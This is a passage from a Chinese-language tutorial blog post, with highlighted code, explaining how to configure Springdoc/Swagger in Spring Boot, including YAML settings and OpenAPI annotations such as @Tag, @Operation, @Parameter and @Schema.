class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AdminController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/admin/dashboard&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getAdminDashboard</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome to the Admin Dashboard!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/admin/settings&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getAdminSettings</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Admin settings page.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.UserController.java&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/user/profile&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserProfile</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is the user&#x27;s profile page.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/user/settings&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getUserSettings</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User settings page.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.OrderController.java&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/order/history&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getOrderHistory</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Here are your past orders.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/order/status&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getOrderStatus</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Order is currently being processed.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.ProductController.java&#x3D;&#x3D;</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/product/list&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getProductList</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;List of available products.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">&quot;/product/details&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">getProductDetails</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Details of the selected product.&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-5-进行相关配置"><a href="#2-5-进行相关配置" class="headerlink" title="2.5. 进行相关配置"></a>2.5. 进行相关配置</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 精简版</span><br><span class="hljs-params">springdoc:</span><br>  <span class="hljs-params">api-docs:</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/v3/api-docs</span><br>    <span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-params">swagger-ui:</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/swagger-ui.html</span><br>    <span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">url:</span> <span class="hljs-symbol">/v3/api-docs</span><br>    <span class="hljs-params">display-request-duration:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">tags-sorter:</span> alpha<br>    <span class="hljs-params">operations-sorter:</span> alpha<br>    <span class="hljs-params">max-displayed-tags:</span> <span class="hljs-number">20</span><br>    <span class="hljs-params">try-it-out-enabled:</span> <span class="hljs-literal">true</span><br><br>  <span class="hljs-params">group-configs:</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">group:</span> <span class="hljs-string">&quot;group1&quot;</span><br>      <span class="hljs-params">packages-to-scan:</span><br>        <span class="hljs-operator">-</span> com.example.demo4.controller<br>      <span class="hljs-params">packages-to-exclude:</span><br>        <span class="hljs-operator">-</span> com.example.demo4.controller.BodyController<br><br><br><span class="hljs-comment"># 2. 注解版</span><br><span class="hljs-params">springdoc:</span><br>  <span class="hljs-params">api-docs:</span>                         <span class="hljs-comment"># API 文档配置</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/v3/api-docs</span>              <span class="hljs-comment"># JSON 类型 API 文档的路径，默认是 /v3/api-docs（加 .yaml 则为 yaml 类型文档）</span><br>    <span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span>                   <span class="hljs-comment"># 启用或禁用 API 文档的生成，默认是 true，即启用文档生成</span><br><br>  <span class="hljs-params">swagger-ui:</span>                       <span class="hljs-comment"># Swagger UI 配置</span><br>    <span class="hljs-params">path:</span> <span class="hljs-symbol">/swagger-ui.html</span>          <span class="hljs-comment"># Swagger UI 的访问路径</span><br>    <span class="hljs-params">enabled:</span> <span class="hljs-literal">true</span>                   <span class="hljs-comment"># 启用或禁用 Swagger UI，默认是 true</span><br>    <span class="hljs-params">url:</span> <span class="hljs-symbol">/v3/api-docs</span>               <span class="hljs-comment"># Swagger UI 加载 API 文档的 URL，默认是 /v3/api-docs</span><br>    <span class="hljs-params">display-request-duration:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># 是否显示请求的持续时间，默认是 false</span><br>    <span class="hljs-params">tags-sorter:</span> alpha              <span class="hljs-comment"># 控制 API 标签（tags）列表的排序方式，默认是 alpha</span><br>    <span class="hljs-params">operations-sorter:</span> alpha        <span class="hljs-comment"># 控制 API 操作的排序方式，默认是 alpha</span><br>    <span class="hljs-params">max-displayed-tags:</span> <span class="hljs-number">20</span>          <span class="hljs-comment"># 限制显示的最大标签数量（-1 是无限制）</span><br>    <span class="hljs-params">try-it-out-enabled:</span> <span class="hljs-literal">true</span>        <span class="hljs-comment"># 启用 Swagger UI 中的试用功能，默认是 true（禁用只能查看 API 文档，不能进行请求测试）</span><br><br>  <span class="hljs-params">group-configs:</span>                    <span class="hljs-comment"># 文档的分组配置</span><br>    <span class="hljs-operator">-</span> <span class="hljs-params">group:</span> <span class="hljs-string">&quot;group1&quot;</span>               <span class="hljs-comment"># 定义分组名称</span><br>      <span class="hljs-params">packages-to-scan:</span>             <span class="hljs-comment"># 扫描指定包下的所有 API</span><br>        <span class="hljs-operator">-</span> com.example.demo4.controller<br>      <span class="hljs-params">packages-to-exclude:</span>          <span class="hljs-comment"># 排除指定包中的 API</span><br>        <span class="hljs-operator">-</span> com.example.demo4.controller.BodyController<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：对此处 <code>group-configs</code> 的理解</p></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250413212434485.png"></p><hr><h4 id="2-6-创建-Springdoc-配置类"><a href="#2-6-创建-Springdoc-配置类" class="headerlink" title="2.6. 创建 Springdoc 配置类"></a>2.6. 创建 Springdoc 配置类</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Configuration</span>                                        <span class="hljs-comment">// 配置类</span><br><span class="hljs-variable">@OpenAPIDefinition</span>(                                   <span class="hljs-comment">// 文档基本信息</span><br>    info = <span class="hljs-variable">@Info</span>(<br>        title = <span class="hljs-string">&quot;My API&quot;</span>,<br>        version = <span class="hljs-string">&quot;v1&quot;</span>,<br>        description = <span class="hljs-string">&quot;This is the API documentation for my application&quot;</span>,<br>        contact = <span class="hljs-variable">@Contact</span>(name = <span class="hljs-string">&quot;John Doe&quot;</span>, email = <span class="hljs-string">&quot;john.doe@example.com&quot;</span>)<br>    )<br>)<br>public class OpenApiConfig &#123;<br>    .......<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="2-7-标注相关注解"><a href="#2-7-标注相关注解" class="headerlink" title="2.7. 标注相关注解"></a>2.7. 标注相关注解</h4><h5 id="2-7-1-Controller-注解"><a href="#2-7-1-Controller-注解" class="headerlink" title="2.7.1. Controller 注解"></a>2.7.1. Controller 注解</h5><h6 id="2-7-1-1-Tag"><a href="#2-7-1-1-Tag" class="headerlink" title="2.7.1.1. @Tag"></a>2.7.1.1. @Tag</h6><p><code>@Tag</code> 用于为 Controller 类或方法添加标签，可以用来组织 API 文档中的接口分组。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Tag</span>(name = <span class="hljs-string">&quot;Admin API&quot;</span>,description = <span class="hljs-string">&quot;Operation related to admins&quot;</span>)<br><span class="hljs-variable">@Tag</span>(name = <span class="hljs-string">&quot;User API&quot;</span>, description = <span class="hljs-string">&quot;Operations related to users&quot;</span>)<br><span class="hljs-variable">@RestController</span><br>public class UserController &#123;<br>    .......<br>&#125;<br><span class="hljs-string">&quot;&quot;</span>&quot;<br><span class="hljs-number">1</span>. name：<br><span class="hljs-number">1</span>. 用于指定标签的名称，用于分组 API。需要注意的是，name 属性不能设置多个值，如果你需要给接口分配多个标签，你可以使用多个 <span class="hljs-variable">@Tag</span> 注解<br><span class="hljs-number">2</span>. description：<br><span class="hljs-number">1</span>. 用于为标签提供详细描述，说明该标签对应的 API 的功能或业务模块<br><span class="hljs-string">&quot;&quot;</span>&quot;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：对此处 <code>@Tag</code> 的理解</p><ol><li>可以将 <code>@Tag</code> 看作是在 <code>group-configs</code> 定义的大分组基础上，通过 <code>@Tag</code> 进行更细粒度的子分组</li><li>每个子分组必须有一个名称。默认情况下，Controller 类在 <code>Swagger UI</code> 中会自动生成一个默认标签（例如，<code>UserController</code> 默认的标签名为 <code>user-controller</code>）。而通过 <code>@Tag</code> 注解，你可以手动为该类指定标签</li><li>注意：Swagger 不仅会扫描 <code>@Tag</code> 注解，还会自动识别 Spring Boot 中的组件类（如 <code>@RestController</code>）。这也是为什么我前面提到：“Controller 类在 <code>Swagger UI</code> 中会自动生成一个默认标签（例如，<code>UserController</code> 默认的标签名为 <code>user-controller</code>）。</li></ol></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250413214149924.png"></p><hr><h6 id="2-7-1-2-Operation"><a href="#2-7-1-2-Operation" class="headerlink" title="2.7.1.2. @Operation"></a>2.7.1.2. @Operation</h6><p><code>@Operation</code> 用于标注一个<strong>方法</strong>，并对该方法进行详细说明。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Operation</span>(  <br>summary = <span class="hljs-string">&quot;Get user by ID&quot;</span>,  <br>description = <span class="hljs-string">&quot;Fetch a user by their unique ID from the database.&quot;</span>,  <br>tags = &#123;<span class="hljs-string">&quot;User&quot;</span>,<span class="hljs-string">&quot;Admin&quot;</span>&#125;,  <br>parameters = &#123;  <br><span class="hljs-variable">@Parameter</span>(xxxxxx),  <br><span class="hljs-variable">@Parameter</span>(xxxxxx)  <br>&#125;,  <br>requestBody = <span class="hljs-variable">@io</span>.swagger.v3.oas.annotations.parameters.<span class="hljs-built_in">RequestBody</span>(xxxxxxx),  <br>responses = &#123;  <br><span class="hljs-variable">@ApiResponse</span>(xxxxxx),  <br><span class="hljs-variable">@ApiResponse</span>(xxxxxx)  <br>&#125;,  <br>deprecated = false  <br>  <br>)  <br><span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">&quot;/users/&#123;id&#125;&quot;</span>)  <br>public User <span class="hljs-built_in">getUserById</span>(  <br>        <span class="hljs-variable">@PathVariable</span> Long id,  <br>        <span class="hljs-variable">@RequestParam</span> String fields  <br>) &#123;  <br>    <span class="hljs-comment">// 查询用户并返回  </span><br>    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">userService</span><span class="hljs-selector-class">.getUserById</span>(id, fields);  <br>&#125;<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;summary&#x3D;&#x3D;：<ol><li>对 API 方法的简短描述</li></ol></li><li>&#x3D;&#x3D;description&#x3D;&#x3D;：<ol><li>对 API 方法的详细描述</li></ol></li><li>&#x3D;&#x3D;tags&#x3D;&#x3D;：<ol><li>用于指定 API 方法的标签</li></ol></li><li>&#x3D;&#x3D;perameters&#x3D;&#x3D;：<ol><li>包含由 <code>@Parameter</code> 注解组成的数组，用于<strong>描述接口参数</strong></li><li><code>@Parameter</code> 注解的具体属性，可以通过 <code>Ctrl + 鼠标点击</code> 查看其来源，或参考下文的 <code>@Parameter</code> 部分，其中列出了常用属性</li></ol></li><li>&#x3D;&#x3D;requestBody&#x3D;&#x3D;：<ol><li><code>@RequestBody</code> 注解的实例，用于描述请求体的内容，通常用于 <code>POST</code>、<code>PUT</code>、<code>PATCH</code> 等请求方法</li><li><code>@RequestBody</code> 注解的具体属性，可以通过 <code>Ctrl + 鼠标点击</code> 查看其来源，或参考下文的 <code>@RequestBody</code> 部分，其中列出了常用属性</li></ol></li><li>&#x3D;&#x3D;responses&#x3D;&#x3D;：<ol><li>包含由 <code>@ApiResponse</code> 注解构成的数组，用于描述接口可能返回的 HTTP 响应</li><li><code>@ApiResponse</code> 注解的具体属性，可以通过 <code>Ctrl + 鼠标点击</code> 查看其来源，或参考下文的 <code>@ApiResponse</code> 部分，其中列出了常用属性</li></ol></li><li>&#x3D;&#x3D;deprecated&#x3D;&#x3D;：<ol><li>用于标记接口是否已弃用。如果设置为 <code>true</code>，表示该接口已不推荐使用，通常会在文档中注明。默认为 <code>false</code></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项：对此处 <code>tags</code> 的理解</p><ol><li>默认情况下，一个 Controller 类中的所有方法，都会在类标注的 <code>@Tag</code> 中，即类级别的标签。而在此处使用 <code>tags</code>，单独指定方法自己的标签</li><li>注意：未真正脱离类 Tag</li></ol></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250413215556974.png"></p><hr><h6 id="2-7-1-3-Parameter"><a href="#2-7-1-3-Parameter" class="headerlink" title="2.7.1.3. @Parameter"></a>2.7.1.3. @Parameter</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Parameter</span>(<br>    name = <span class="hljs-string">&quot;id&quot;</span>, <br>    description = <span class="hljs-string">&quot;User ID&quot;</span>, <br>    example = <span class="hljs-string">&quot;123&quot;</span>, <br>    schema = <span class="hljs-variable">@Schema</span>(implementation = User.class),<br>    in = ParameterIn.PATH,<br>    required = true, <br>    allowEmptyValue = true<br>)<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;name&#x3D;&#x3D;：<ol><li>描述的参数的名称，通常与方法参数名称一致。</li></ol></li><li>&#x3D;&#x3D;description&#x3D;&#x3D;：<ol><li>用于描述参数的含义或功能。</li></ol></li><li>&#x3D;&#x3D;example&#x3D;&#x3D;：<ol><li>用于为参数提供示例值，帮助开发者理解该参数的典型值。</li></ol></li><li>&#x3D;&#x3D;schema&#x3D;&#x3D;：<ol><li>指向参数对应的模型类（Model 类）</li></ol></li><li>&#x3D;&#x3D;in&#x3D;&#x3D;：<ol><li>用于指定参数的来源，通常是 path、query、header 或 cookie。</li><li><font color="#00b0f0">path</font>：表示参数来自 URL 路径，通常用于路径变量（例如 &#x2F;users&#x2F;{id}）</li><li><font color="#00b0f0">query</font>：表示参数来自 URL 查询字符串，通常用于 GET 请求中的查询参数</li><li><font color="#00b0f0">header</font>：表示参数来自 HTTP 请求头部（例如授权令牌 Authorization）</li><li><font color="#00b0f0">cookie</font>：表示参数来自 HTTP 请求的 Cookie（例如 JSESSIONID）</li></ol></li><li>&#x3D;&#x3D;required&#x3D;&#x3D;：<ol><li>用于指定参数是否为必需的，默认值为 false。</li></ol></li><li>&#x3D;&#x3D;allowEmptyValue&#x3D;&#x3D;：<ol><li>用于指示该参数是否允许为空值，通常应用于查询参数，默认值为 false。</li></ol></li></ol><hr><h6 id="2-7-1-4-RequestBody"><a href="#2-7-1-4-RequestBody" class="headerlink" title="2.7.1.4. @RequestBody"></a>2.7.1.4. @RequestBody</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@RequestBody</span>(  <br>        description = <span class="hljs-string">&quot;User data&quot;</span>,  <br>        required = true,  <br>        content = <span class="hljs-variable">@Content</span>(xxxxx)  <br>)<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;description&#x3D;&#x3D;：<ol><li>描述请求体的内容</li></ol></li><li>&#x3D;&#x3D;required&#x3D;&#x3D;：<ol><li>指定请求体是否是必需的，默认是 true</li></ol></li><li>&#x3D;&#x3D;content&#x3D;&#x3D;: <ol><li><code>@Content</code> 注解的实例，用于描述请求体或响应体的内容类型和结构</li><li><code>@Content</code> 注解的具体属性，可以通过 <code>Ctrl + 鼠标点击</code> 查看其来源，或参考下文的 <code>@Content</code> 部分，其中列出了常用属性</li></ol></li></ol><hr><h6 id="2-7-1-5-ApiResponse"><a href="#2-7-1-5-ApiResponse" class="headerlink" title="2.7.1.5. @ApiResponse"></a>2.7.1.5. @ApiResponse</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@ApiResponse</span>(<br>responseCode = <span class="hljs-string">&quot;200&quot;</span>,<br>description = <span class="hljs-string">&quot;Successfully retrieved the user&quot;</span>,<br>content = <span class="hljs-variable">@Content</span>(xxxxxx)<br>)<br></code></pre></td></tr></table></figure><ol><li>&#x3D;&#x3D;responseCode&#x3D;&#x3D;：<ol><li>用于指定响应的 HTTP 状态码，例如 200、400、404、500 等</li></ol></li><li>&#x3D;&#x3D;description&#x3D;&#x3D;：<ol><li>用于为该响应状态码提供详细的描述</li></ol></li><li>&#x3D;&#x3D;content&#x3D;&#x3D;: <ol><li><code>@Content</code> 注解的实例，用于描述请求体或响应体的内容类型和结构</li><li><code>@Content</code> 注解的具体属性，可以通过 <code>Ctrl + 鼠标点击</code> 查看其来源，或参考下文的 <code>@Content</code> 部分，其中列出了常用属性</li></ol></li></ol><hr><h6 id="2-7-1-6-Content"><a href="#2-7-1-6-Content" class="headerlink" title="2.7.1.6. @Content"></a>2.7.1.6. @Content</h6><p><code>@Content</code> 注解用于描述请求体或响应体的内容类型和结构</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">content = @Content(<br>mediaType = <span class="hljs-string">&quot;application/json&quot;</span>,<br>schema = @Schema(implementation = User.<span class="hljs-keyword">class</span>),<br>examples = @ExampleObject(<span class="hljs-keyword">value</span> = <span class="hljs-string">&quot;&#123;\&quot;</span>name\<span class="hljs-string">&quot;:\&quot;</span>John Doe\<span class="hljs-string">&quot;,\&quot;</span>age\<span class="hljs-string">&quot;:30&#125;&quot;</span>),<br>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. mediaType：</span><br><span class="hljs-string">1. 用于指定响应体的 MIME 类型，例如 application/json、text/plain 等</span><br><span class="hljs-string">2. schema：</span><br><span class="hljs-string">1. 指向对应的模型类（Model 类）</span><br><span class="hljs-string">3. examples：</span><br><span class="hljs-string">1. 用于提供内容的示例数据</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="2-7-2-Model-注解"><a href="#2-7-2-Model-注解" class="headerlink" title="2.7.2. Model 注解"></a>2.7.2. Model 注解</h5><h6 id="2-7-2-1-Schema"><a href="#2-7-2-1-Schema" class="headerlink" title="2.7.2.1. @Schema"></a>2.7.2.1. @Schema</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@Schema(<span class="hljs-params">name = <span class="hljs-string">&quot;User&quot;</span>, description = <span class="hljs-string">&quot;User object representing a system user&quot;</span></span>)</span><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;  <br><br><span class="hljs-meta">    @Schema(<span class="hljs-params">description = <span class="hljs-string">&quot;Unique identifier of the user&quot;</span>, example = <span class="hljs-string">&quot;1&quot;</span>, defaultValue = <span class="hljs-string">&quot;100&quot;</span></span>)</span><br>    private Long <span class="hljs-built_in">id</span>;  <br><br><span class="hljs-meta">    @Schema(<span class="hljs-params">description = <span class="hljs-string">&quot;Username of the user&quot;</span>, required = true, example = <span class="hljs-string">&quot;john_doe&quot;</span></span>)</span><br>    private String username;  <br><br><span class="hljs-meta">    @Schema(<span class="hljs-params">description = <span class="hljs-string">&quot;Email address of the user&quot;</span>, example = <span class="hljs-string">&quot;john@example.com&quot;</span></span>)</span><br>    private String email;  <br><br><span class="hljs-meta">    @Schema(<span class="hljs-params">description = <span class="hljs-string">&quot;Age of the user&quot;</span>, example = <span class="hljs-string">&quot;25&quot;</span>, defaultValue = <span class="hljs-string">&quot;25&quot;</span></span>)</span><br>    private Integer age;  <br><br><span class="hljs-meta">    @Schema(<span class="hljs-params">description = <span class="hljs-string">&quot;Creation date of the user account&quot;</span>, <span class="hljs-built_in">format</span> = <span class="hljs-string">&quot;date-time&quot;</span>, example = <span class="hljs-string">&quot;2024-01-01T00:00:00Z&quot;</span></span>)</span><br>    private LocalDateTime createdAt;  <br><br>    // Getters <span class="hljs-keyword">and</span> Setters<br>&#125;<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. name：</span><br><span class="hljs-string">1. 指定模型的名称。</span><br><span class="hljs-string">2. description：</span><br><span class="hljs-string">1. 为该模型提供简短描述，说明它的用途或功能  </span><br><span class="hljs-string">3. required：</span><br><span class="hljs-string">1. 表示该属性是否是必需的，默认为 false  </span><br><span class="hljs-string">4. example：</span><br><span class="hljs-string">1. 属性实例数据</span><br><span class="hljs-string">5. defaultValue：</span><br><span class="hljs-string">1. 字段的默认值  </span><br><span class="hljs-string">6. format：</span><br><span class="hljs-string">1. 指定字段的格式，通常用于日期、时间等特殊格式字段，有助于文档生成工具（如 Swagger/OpenAPI）正确地展示字段的数据格式</span><br><span class="hljs-string">2. date-time：表示日期和时间，符合 ISO 8601 标准，格式为 yyyy-MM-dd&#x27;T&#x27;HH:mm:ssZ，例如 2024-01-01T12:00:00Z ，适用类型：LocalDateTime, Date, ZonedDateTime 等</span><br><span class="hljs-string">3. date：仅表示日期，格式为 yyyy-MM-dd，例如 2024-01-01，适用类型：LocalDate</span><br><span class="hljs-string">4. time：仅表示时间，格式为 HH:mm:ss，例如 12:00:00，适用类型：LocalTime</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>如果你只是定义了一个 <code>User</code> 类，但没有在 Swagger 能扫描到的方法中使用它（作为参数或返回值），那么即便你写了 <code>@Schema</code> 注解，也不会在 Swagger UI 中显示</li><li>只要在被 Swagger 扫描的方法中引用了 <code>User</code>（比如作为请求参数或响应结果），它就会自动展示出你标注的字段说明，例如：</li></ol></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span 